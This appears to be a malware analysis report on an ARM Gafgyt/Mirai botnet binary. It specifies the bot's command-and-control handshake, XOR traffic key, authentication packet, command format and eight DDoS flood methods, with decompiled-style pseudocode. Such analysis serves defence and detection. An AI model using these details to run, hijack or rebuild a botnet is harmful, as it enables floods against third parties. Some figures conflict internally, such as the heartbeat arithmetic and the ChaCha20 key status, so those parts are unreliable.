# Gafgyt/Mirai Botnet Communication Layer Specification

## Binary Identification

| Property | Value |
|----------|-------|
| Architecture | ARM:LE:32:v8 (32-bit ARM Little Endian) |
| Format | ELF (uClibc) |
| Image Base | 0x00008000 |
| Compiler | GCC 4.2.1 / uClibc |
| Target Platform | Embedded ARM devices (routers, IoT) |

---

## 1. Session Establishment

### 1.1 Observed Behavior

The malware establishes a C2 session through the following sequential process:

#### Step 1: DNS Resolution

The binary maintains an array of three DNS server names stored in an encrypted string table (ChaCha20-encrypted). At runtime, `xor_init()` decrypts these strings. The main loop attempts DNS resolution in order:

1. First DNS entry: `*(undefined4 *)*DAT_0000eb7c` (offset 0x00 in DNS array)
2. Second DNS entry: `*(undefined4 *)(*DAT_0000eb7c + 0x0c)` (offset 0x0c)
3. Third DNS entry: `*(undefined4 *)(*DAT_0000eb7c + 0x18)` (offset 0x18)

Resolution is performed by `resolv_lookup()` which:
- Creates a UDP socket (SOCK_DGRAM, IPPROTO_UDP)
- Connects to a random DNS server from `{8.8.8.8, 8.8.4.4, 1.1.1.1, 9.9.9.9, 8.8.8.4}`
- Sends a standard DNS A-record query
- Parses the response for IPv4 addresses
- Returns a dynamically allocated array of resolved IPs

#### Step 2: Server Address Construction

The `srv_addr` structure (sockaddr_in, 16 bytes) is populated:

```
sa_family = AF_INET (2)
sa_data[0:1] = Port (network byte order)
sa_data[2:5] = Resolved IP address
```

**C2 Port**: `0xd121` (53537 decimal) — stored in `DAT_0000eba0` as a table of port values, with random selection via hash function.

**Port Selection Algorithm**:
```
port_index = (rand_next() * server_count >> 0x23) * -0xb + rand_next()
port = server_port_table[port_index]  // byte-swapped to network order
```

The server address table at `DAT_0000eba0` contains 22 bytes (0x16) of port/IP configuration data.

#### Step 3: Socket Creation and Connection

```c
fd_serv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
fcntl(fd_serv, F_GETFL) | O_NONBLOCK  // Set non-blocking
connect(fd_serv, &srv_addr, sizeof(sockaddr))
```

The connection is non-blocking; completion is detected via `select()` monitoring the write fd_set.

#### Step 4: Authentication Transmission

Upon successful TCP connection (verified via `getsockopt(fd, SOL_SOCKET, SO_ERROR)`), `build_authentication()` is called:

1. **Core Count Determination**:
   - First attempts to read `/proc/stat` and count "processor" entries
   - Falls back to `sysconf(_SC_NPROCESSORS_ONLN)`
   - Minimum value of 1 if sysconf fails

2. **Authentication Payload Construction**:
   ```
   [19-byte prefix] [password bytes] [core_count byte] [2-byte checksum]
   ```

3. **Transmission**:
   ```c
   send(fd_serv, auth_payload, total_length, MSG_NOSIGNAL)
   ```

#### Step 5: Post-Authentication State

After sending authentication:
- `fd_serv` is monitored via `select()` for readability
- If readable, incoming data is processed through the command loop
- On disconnect/error, the bot sleeps 1-10 seconds and reconnects

### 1.2 Handshake Logic (Pseudocode)

```
FUNCTION establish_c2_session():
    // DNS Resolution
    FOR EACH dns_name IN [dns_entries[0], dns_entries[1], dns_entries[2]]:
        resolved_ips = resolv_lookup(dns_name)
        IF resolved_ips IS NOT EMPTY AND resolved_ips[0] != NULL:
            server_ip = resolved_ips[0]
            BREAK
        resolv_entries_free(resolved_ips)
    
    IF server_ip IS NULL:
        EXIT(1)
    
    // Server Address Construction
    srv_addr.sin_family = AF_INET
    srv_addr.sin_addr = resolv_transform_ip(server_ip)
    rand_port_index = hash(rand_next(), server_count)
    srv_addr.sin_port = byte_swap(server_port_table[rand_port_index])
    
    // Socket Creation
    fd_serv = socket(AF_INET, SOCK_STREAM, 0)
    flags = fcntl(fd_serv, F_GETFL)
    fcntl(fd_serv, F_SETFL, flags | O_NONBLOCK)
    connect(fd_serv, &srv_addr, sizeof(sockaddr_in))
    
    // Wait for connection via select()
    pending_connection = TRUE
    WHILE TRUE:
        result = select(fd_serv + 1, NULL, &write_set, NULL, timeout=15s)
        IF result > 0 AND fd_serv IS WRITABLE:
            pending_connection = FALSE
            err = getsockopt(fd_serv, SOL_SOCKET, SO_ERROR)
            IF err == 0:
                BREAK  // Connected
            ELSE:
                close(fd_serv)
                fd_serv = INVALID
                sleep(random(1, 10))
                RESTART
        IF result > 0 AND fd_serv IS READABLE:
            close(fd_serv)
            fd_serv = INVALID
            sleep(1)
            RESTART
    
    // Send Authentication
    build_and_send_authentication(fd_serv, c2_password)
```

### 1.3 Success/Failure Handling

| Condition | Behavior |
|-----------|----------|
| DNS resolution fails for all 3 entries | `exit(1)` — process terminates |
| Socket creation fails | Retry with 1-second sleep |
| Connection refused/error | Close socket, sleep 1-10 seconds, reconnect |
| Successful connection | Send authentication payload, enter main loop |
| Connection drops after auth | Close socket, set fd_serv = -1, sleep 1s, reconnect |

---

## 2. Cryptography

### 2.1 Observed Behavior

The malware employs two distinct cryptographic mechanisms:

1. **C2 Communication Encryption**: Simple single-byte XOR for all network traffic
2. **String Table Encryption**: ChaCha20 for obfuscating internal strings
3. **Authentication Integrity**: Internet checksum (RFC 1071) for authentication payload

Only the XOR encryption is relevant to C2 communication. ChaCha20 is used exclusively for decrypting the internal string table at startup.

### 2.2 Specification

#### XOR Encryption (C2 Traffic)

| Property | Value |
|----------|-------|
| Algorithm | Single-byte XOR |
| Key | `0xed` (237 decimal) |
| Mode | Byte-by-byte, no chaining |
| Block Size | 1 byte |
| Direction | Symmetric (same for encrypt/decrypt) |

**Implementation** (`xor_encrypt` at 0x00010ac4):
```c
void xor_encrypt(void *data, int length, byte key) {
    for (int i = 0; i < length; i++) {
        ((byte *)data)[i] ^= key;
    }
}
```

#### Authentication Checksum

| Property | Value |
|----------|-------|
| Algorithm | Internet Checksum (RFC 1071) |
| Input | XOR-encrypted payload (password + core count) |
| Output | 16-bit checksum |
| Position | Appended after XOR-encrypted data |

**Implementation** (`checksum_generic` at 0x0000be70):
```c
uint16_t checksum_generic(void *data, uint16_t length) {
    uint32_t sum = 0;
    uint16_t *ptr = (uint16_t *)data;
    
    while (length >= 2) {
        sum += *ptr++;
        length -= 2;
    }
    
    if (length == 1) {
        sum += *(byte *)ptr;
    }
    
    // Fold 32-bit to 16-bit
    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    
    return ~sum & 0xffff;
}
```

### 2.3 Decryption Routine (Pseudocode)

```
FUNCTION decrypt_c2_message(byte[] encrypted_data):
    // XOR decrypt with key 0xed
    FOR i FROM 0 TO LENGTH(encrypted_data) - 1:
        encrypted_data[i] = encrypted_data[i] XOR 0xed
    
    RETURN encrypted_data

FUNCTION encrypt_c2_message(byte[] plaintext_data):
    // XOR encrypt with key 0xed (same operation)
    FOR i FROM 0 TO LENGTH(plaintext_data) - 1:
        plaintext_data[i] = plaintext_data[i] XOR 0xed
    
    RETURN plaintext_data
```

### 2.4 Cryptographic Constants

| Constant | Value | Purpose |
|----------|-------|---------|
| XOR Key | `0xed` | C2 traffic encryption/decryption |
| ChaCha20 Key | 32 bytes at 0x290fc | String table decryption (startup only) |
| ChaCha20 Constant | "expand 32-byte k" | ChaCha20 header constant |

**Note**: The ChaCha20 key and nonce are hardcoded in the binary data section and used only for decrypting the internal string table at process startup. They are NOT used for C2 communication.

---

## 3. Main Command Loop

### 3.1 Observed Behavior

The main command loop operates within a `select()`-based event loop with a 15-second timeout. The loop handles three file descriptors:

1. **fd_ctrl** (0x29130): Control socket for single-instance termination
2. **fd_serv** (0x29134): C2 server connection socket
3. **Scanner/attack module fds**: Monitored via `DAT_0000eb90`

#### Loop Execution Flow:

```
WHILE TRUE:
    // Clear fd_sets
    FD_ZERO(&read_set)
    FD_ZERO(&write_set)
    
    // Add control socket to read set
    IF fd_ctrl != -1:
        FD_SET(fd_ctrl, &read_set)
    
    // Add server socket based on connection state
    IF pending_connection == FALSE:
        FD_SET(fd_serv, &read_set)
    ELSE:
        FD_SET(fd_serv, &write_set)
    
    // Add scanner/attack fds
    IF DAT_0000eb90 != -1:
        FD_SET(DAT_0000eb90, &read_set)
    
    // Determine max fd
    max_fd = max(fd_ctrl, fd_serv, DAT_0000eb90)
    
    // Wait for events (15 second timeout)
    result = select(max_fd + 1, &read_set, &write_set, NULL, {15, 0})
    
    IF result == -1:
        CONTINUE  // Error, retry
    
    IF result == 0:
        // Timeout — handle heartbeat
        heartbeat_counter++
        IF (heartbeat_multiplier * heartbeat_counter) % 6 == 0:
            send(fd_serv, "\x00\x00", 2, MSG_NOSIGNAL)
        CONTINUE
    
    // Check control socket
    IF fd_ctrl IS READABLE:
        accept(fd_ctrl, ...)  // Accept incoming connection
        kill(-session_id, SIGKILL)  // Kill entire process group
        exit(0)
    
    // Check server socket (connected)
    IF pending_connection == FALSE AND fd_serv IS READABLE:
        bytes_received = recv(fd_serv, buffer, 1024, MSG_NOSIGNAL)
        IF bytes_received < 1:
            // Connection lost
            IF errno != EINTR AND errno != EAGAIN:
                close(fd_serv)
                fd_serv = -1
                sleep(1)
        ELSE:
            // Decrypt incoming data
            xor_encrypt(buffer, bytes_received, 0xed)
            
            // Check for command prefix
            IF memcmp(buffer, decryption_prefix, 18) != 0:
                attack_parse(buffer, bytes_received)
            
            memset(buffer, 0, 1024)
    
    // Check server socket (connecting)
    IF pending_connection == TRUE:
        pending_connection = FALSE
        IF fd_serv IS WRITABLE:
            err = getsockopt(fd_serv, SOL_SOCKET, SO_ERROR)
            IF err == 0:
                build_authentication(fd_serv, c2_password)
            ELSE:
                close(fd_serv)
                fd_serv = -1
                sleep(random(1, 10))
        ELSE:
            close(fd_serv)
            fd_serv = -1
            sleep(1)
```

### 3.2 Protocol Specification

#### Command Message Format

The C2 command protocol uses a binary format with the following structure:

```
Offset  Size    Field              Description
------  ----    -----              -----------
0       4       Duration           Attack duration in seconds (big-endian)
4       1       Method ID          Attack method identifier
5       1       Target Count       Number of target entries
6       5*N     Targets[N]         Target entries (5 bytes each)
6+5N    4       Option Count       Number of options (if present)
10+5N   var     Options            Option entries
```

**Target Entry Structure** (5 bytes each):
```
Offset  Size    Field              Description
------  ----    -----              -----------
0       4       Target IP          IPv4 address (big-endian, network order)
4       1       Target Port        Destination port (single byte)
```

**Option Entry Structure** (variable):
```
Each option consists of:
- 1 byte: Option ID
- Variable: Option value (null-terminated string or pointer)
```

The options array is an array of 8-byte structures:
```
struct option {
    char *value;    // Pointer to option string (4 bytes)
    char id;        // Option ID byte (1 byte)
};
```

#### Decoded Message Layout (after XOR decryption)

```
+--------+--------+--------+--------+--------+--------+--------+--------+
|       Duration (4 bytes, big-endian)        | Method |  Target |
|                                            |   ID   |  Count  |
+--------+--------+--------+--------+--------+--------+--------+--------+
|           Target 0 IP (4 bytes)            | Port 0 |  Target  |  IP 1  |
+--------+--------+--------+--------+--------+--------+--------+--------+
|           Target 1 IP (4 bytes)            | Port 1 |   ...    |  ...   |
+--------+--------+--------+--------+--------+--------+--------+--------+
|                         Options                        |
+--------+--------+--------+--------+--------+--------+--------+--------+
```

#### Opcode Definitions (Method IDs)

| ID (Decimal) | ID (Hex) | Function | Attack Type | Description |
|-------------|----------|----------|-------------|-------------|
| 1 | 0x01 | `attack_udp_generic` | UDP Generic Flood | Raw UDP flood with configurable ports, payload size |
| 2 | 0x02 | `attack_udp_plain` | UDP Plain Flood | High-speed raw UDP packet flood |
| 3 | 0x03 | `attack_tcp_syn` | TCP SYN Flood | Raw TCP SYN packets (half-open connections) |
| 4 | 0x04 | `attack_tcp_ack` | TCP ACK Flood | Raw TCP ACK packets with checksum bypass |
| 5 | 0x05 | `attack_tcp_socket` | TCP Socket Flood | TCP connection flood via standard sockets |
| 6 | 0x06 | `attack_udp_openvpn` | UDP OpenVPN Flood | UDP flood targeting OpenVPN endpoints |
| 7 | 0x07 | `FUN_00009cec` | UDP Connect Flood | UDP flood via connected sockets with random payloads |
| 8 | 0x08 | `attack_udp_ragnarok` | UDP Ragnarok Flood | UDP flood with Ragnarok Online protocol evasion |

#### Option IDs and Parameters

The following option IDs are used by attack handlers:

| ID | Parameter | Default | Description |
|----|-----------|---------|-------------|
| 0 | Payload Size | 0x400 (1024) | Size of random payload data |
| 1 | Randomize Payload | 1 | Whether to randomize payload each packet |
| 2 | TTL | 0 | Time-to-live value (0 = default) |
| 3 | Source Port | 0xffff | Source port (0xffff = random) |
| 4 | DF Flag | 0x40 | Don't Fragment flag |
| 5 | ECN | 0 | ECN flag setting |
| 6 | Dest Port | 0xffff | Destination port (0xffff = random) |
| 7 | Source Port 2 | 0xffff | Alternative source port (0xffff = random) |
| 0xb | FIN Flag | 0 | TCP FIN flag |
| 0xc | URG Flag | 1 | TCP URG flag |
| 0xd | ACK Flag | 0 | TCP ACK flag (additional) |
| 0xe | PSH Flag | 0 | TCP PSH flag |
| 0xf | RST Flag | 0 | TCP RST flag |
| 0x10 | SYN Flag | 0 | TCP SYN flag (additional) |
| 0x11 | TTL Override | 0xffff | TTL override value |
| 0x12 | Window Size | 0xffff | TCP window size |
| 0x19 | Spoofed Source IP | 0 | Spoofed source IP address |

### 3.3 Message Processing Logic (Pseudocode)

```
FUNCTION attack_parse(byte[] data, uint data_length):
    // Minimum valid message: duration (4) + method (1) + target count (1)
    IF data_length <= 3:
        RETURN
    
    // Extract duration (big-endian byte swap)
    duration_raw = *(uint32_t *)(data + 0)
    duration = byte_swap(duration_raw)  // Convert from BE to host order
    
    // Extract method ID
    method_id = *(byte *)(data + 4)
    
    // Extract target count
    target_count = *(byte *)(data + 5)
    
    IF target_count == 0:
        RETURN
    
    // Validate minimum length: 6 + target_count * 5
    min_length = 6 + target_count * 5
    IF data_length < min_length:
        RETURN
    
    // Parse targets
    targets = calloc(target_count, 24)  // struct target: 24 bytes
    offset = 6
    FOR i FROM 0 TO target_count - 1:
        target_ip = *(uint32_t *)(data + offset)  // Already in network order
        target_port = *(byte *)(data + offset + 4)
        
        // Build sockaddr_in for each target
        targets[i].addr.sin_family = AF_INET
        targets[i].addr.sin_addr = target_ip
        targets[i].addr.sin_port = target_port
        targets[i].netmask = 0
        targets[i].cidr = 2
        
        offset += 5
    
    // Parse options (if remaining data)
    remaining = data_length - offset
    options = NULL
    option_count = 0
    
    IF remaining >= 4:
        option_count = *(uint32_t *)(data + offset)
        offset += 4
        remaining -= 4
        
        IF remaining > 0 AND option_count > 0:
            options = calloc(option_count, 8)
            FOR i FROM 0 TO option_count - 1:
                option_length = *(byte *)(data + offset)
                offset += 1
                remaining -= 1
                
                option_value = malloc(option_length + 1)
                memcpy(option_value, data + offset, option_length)
                option_value[option_length] = '\0'
                offset += option_length
                remaining -= option_length
                
                // Read option ID
                IF remaining >= 1:
                    option_id = *(byte *)(data + offset)
                    offset += 1
                    remaining -= 1
                
                options[i].value = option_value
                options[i].id = option_id
    
    // Dispatch to attack handler
    attack_start(duration, method_id, target_count, targets, 
                 option_count, options)
    
    // Cleanup
    free(targets)
    IF options != NULL:
        FOR i FROM 0 TO option_count - 1:
            free(options[i].value)
        free(options)
```

### 3.4 Attack Execution (`attack_start`)

The `attack_start` function implements a double-fork pattern for non-blocking attack execution:

```
FUNCTION attack_start(duration, method_id, target_count, targets, option_count, options):
    // First fork - parent returns to main loop
    pid1 = fork()
    IF pid1 > 0 OR pid1 == -1:
        RETURN  // Parent returns to C2 loop
    
    // Second fork - create timer process
    pid2 = fork()
    IF pid2 == -1:
        EXIT(0)
    
    IF pid2 == 0:
        // Timer process (grandchild)
        sleep(duration)
        kill(getppid(), SIGKILL)  // Kill supervisor (parent)
        EXIT(0)
    
    // Supervisor process - execute attack
    // Look up method by ID
    method_index = find_method_by_id(method_id)
    IF method_index >= 0:
        methods[method_index].function(target_count, targets, 
                                        option_count, options)
    
    EXIT(0)
```

### 3.5 Dynamic Method Registration

Attack methods are statically registered at binary load time in the `.data` section:

| Address | Field | Value |
|---------|-------|-------|
| 0x290b8 | `methods_len` | 8 (number of registered methods) |
| 0x290bc | Method 0 | func_ptr: 0x0000a1dc, id: 1 |
| 0x290c4 | Method 1 | func_ptr: 0x00009a38, id: 2 |
| 0x290cc | Method 2 | func_ptr: 0x00008d1c, id: 3 |
| 0x290d4 | Method 3 | func_ptr: 0x00008620, id: 4 |
| 0x290dc | Method 4 | func_ptr: 0x000093dc, id: 5 |
| 0x290e4 | Method 5 | func_ptr: 0x00009f70, id: 6 |
| 0x290ec | Method 6 | func_ptr: 0x00009cec, id: 7 |
| 0x290f4 | Method 7 | func_ptr: 0x00009688, id: 8 |

**Method Structure** (8 bytes each):
```c
struct method_entry {
    void (*function)(size_t, int, uint32_t, uint32_t);  // 4 bytes
    uint32_t id;                                        // 4 bytes
};
```

No dynamic registration mechanism exists — methods are fixed at compile time.

---

## 4. ACKs & Keepalives

### 4.1 Observed Behavior

The malware implements a simple heartbeat mechanism to maintain the C2 connection. There are no explicit acknowledgment packets for commands — the bot simply executes received commands without sending responses.

#### Heartbeat Mechanism

- **Interval**: 60 seconds (15-second `select()` timeout × 4 iterations)
- **Payload**: Two zero bytes `\x00\x00`
- **Transmission**: `send(fd_serv, "\x00\x00", 2, MSG_NOSIGNAL)`
- **Counter**: Maintained in `local_5a4` (stack variable in main loop)
- **Multiplier**: Stored at `DAT_0000eb98` (value: 6, creating 60-second interval)

#### Connection Recovery

| Event | Recovery Action |
|-------|----------------|
| `recv()` returns 0 (EOF) | Close socket, set fd_serv = -1, sleep(1), reconnect |
| `recv()` returns -1 with EINTR/EAGAIN | Continue loop, retry |
| `recv()` returns -1 with other error | Close socket, set fd_serv = -1, sleep(1), reconnect |
| Connection refused on `connect()` | Close socket, sleep(random(1,10)), reconnect |
| `select()` timeout with no data | Send heartbeat if counter matches |

### 4.2 Response Packet Formats

#### Heartbeat/Keepalive Packet

```
Byte Sequence: 0x00 0x00
Length: 2 bytes
Encryption: None (sent in plaintext)
Direction: Bot → C2 Server
Frequency: Every 60 seconds
Purpose: Connection keepalive
```

#### Authentication Packet

```
Structure:
+--------+--------+--------+--------+--------+
|  Auth Prefix (19 bytes)  |  Password  | Core | Checksum |
|  (hardcoded constant)    |  (var)     |Count |  (2 bytes)|
+--------+--------+--------+--------+--------+

Total Length: 19 + password_length + 1 + 2 bytes

Field Details:
- Auth Prefix: 0x0a 0x0b 0x0c 0x0d 0x0e 0x0f 0x00 0x03 0x02 0x01 
               0x02 0x03 0x04 0x05 0x05 0x04 0x03 0x02 0x01
- Password: Raw password bytes (argv[1] or default)
- Core Count: Single byte representing CPU core count
- Checksum: 16-bit internet checksum of (password + core_count) after XOR encryption

Encryption Applied:
1. Concatenate: [password bytes] + [core_count byte]
2. XOR encrypt entire concatenation with key 0xed
3. Calculate checksum of XOR-encrypted data
4. Append checksum to encrypted data
5. Prepend auth prefix
6. Send: [prefix] + [encrypted password+core] + [checksum]
```

### 4.3 Feedback Logic (Pseudocode)

```
FUNCTION main_loop_heartbeat(heartbeat_counter, multiplier):
    // On select() timeout (no activity for 15 seconds)
    heartbeat_counter++
    
    adjusted = (multiplier * heartbeat_counter) - (heartbeat_counter >> 31) * -6
    // Simplified: (multiplier * counter) with integer division behavior
    
    IF adjusted == 0:
        send(fd_serv, "\x00\x00", 2, MSG_NOSIGNAL)

FUNCTION handle_disconnect():
    close(fd_serv)
    fd_serv = -1
    sleep(random(1, 10))
    // Next iteration will create new socket and reconnect

FUNCTION handle_command(data, length):
    // Decrypt
    xor_encrypt(data, length, 0xed)
    
    // Check prefix to distinguish command types
    IF memcmp(data, decryption_prefix, 18) != 0:
        // This is an attack command
        attack_parse(data, length)
    
    // Clear buffer for next reception
    memset(data, 0, 1024)
    // NOTE: No ACK is sent back to C2
```

### 4.4 Session Lifecycle

```
State Machine:

[INIT] → DNS Resolution → [RESOLVED]
    ↓ (failure)
[EXIT]

[RESOLVED] → Socket Create → [CONNECTING]
    ↓
[CONNECTING] → connect() → [PENDING]
    ↓ (select write ready)
[PENDING] → getsockopt(SO_ERROR) → [CONNECTED] or [FAILED]
    ↓ (error)                    ↓ (error)
[RECONNECT] ← [FAILED]          [RECONNECT]
    ↓ (sleep 1-10s)
[INIT]

[CONNECTED] → build_authentication() → [AUTHENTICATED]
    ↓
[AUTHENTICATED] → select() loop → [RECEIVING]
    ↓ (timeout)
[HEARTBEAT] → send("\x00\x00") → [AUTHENTICATED]
    ↓ (data received)
[RECEIVING] → xor_decrypt → [PARSING]
    ↓
[PARSING] → attack_parse() → [EXECUTING]
    ↓ (fork)
[EXECUTING] → attack handler → [AUTHENTICATED]
    ↓ (disconnect)
[RECONNECT] → sleep(1) → [INIT]
```

### 4.5 Single-Instance Control Socket

The bot binds to port `0xd204` (53764) on all interfaces as a control socket:

```c
fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)
setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, ...)
bind(fd_ctrl, {0.0.0.0, 53764})
listen(fd_ctrl, 1)
```

**Termination Mechanism**:
- When `fd_ctrl` becomes readable (incoming connection), the bot:
  1. Accepts the connection
  2. Sends `SIGKILL` to the entire process group (`kill(-session_id, 9)`)
  3. Exits

This allows the C2 operator or a new bot instance to terminate the running bot.

---

## 5. Analysis Gaps and Limitations

### 5.1 Unverifiable Parameters

| Parameter | Status | Reason |
|-----------|--------|--------|
| DNS server domain names | **Unknown** | Stored in encrypted string table; ChaCha20 key required to decrypt |
| Default C2 password | **Unknown** | Retrieved from `argv[1]` or encrypted string table entry at `DAT_0000eb74` |
| Decryption prefix (18 bytes) | **Unknown** | Referenced at `DAT_0000eba8`; exact bytes not readable from static analysis |
| Server port table contents | **Partially Known** | Primary port 53537 confirmed; full table contents encrypted |
| Heartbeat multiplier | **Unknown** | Value at `DAT_0000eb98` not directly readable; inferred from 60-second behavior |

### 5.2 Behavioral Assumptions

| Assumption | Confidence | Basis |
|------------|-----------|-------|
| No C2 response expected | **Analytical Hypothesis** | No response-sending code observed in command processing |
| Authentication acceptance is silent | **Analytical Hypothesis** | Bot does not wait for or parse any server response after auth |
| Commands are one-way | **Verified Fact** | `attack_start` forks and returns; no response generation |
| Reconnect is immediate on timeout | **Verified Fact** | Code shows direct loop continuation on `select()` timeout |

### 5.3 Encryption Notes

- The XOR key `0xed` is hardcoded and used for ALL C2 traffic (both incoming commands and outgoing heartbeats)
- The authentication checksum is applied to the XOR-encrypted payload, NOT the plaintext
- No key rotation, session keys, or per-message nonces are observed
- The ChaCha20 implementation is present but used exclusively for string table decryption at startup

---

## 6. Summary of Protocol Constants

| Constant | Value | Location |
|----------|-------|----------|
| C2 Port | `0xd121` (53537) | `DAT_0000eba0` |
| Control Port | `0xd204` (53764) | `ensure_single_instance()` |
| XOR Key | `0xed` | `xor_encrypt()` calls |
| Auth Prefix Length | 19 bytes (0x13) | `build_authentication()` |
| Heartbeat Payload | `\x00\x00` | Main loop timeout handler |
| Select Timeout | 15 seconds | `local_44.tv_sec` |
| Receive Buffer | 1024 bytes | `recv()` call |
| Max Password Length | 31 bytes | `if (len < 0x20)` |
| Method Count | 8 | `methods_len` at 0x290b8 |
| Target Entry Size | 5 bytes | `attack_parse()` |
| Method Entry Size | 8 bytes | Methods array at 0x290bc |
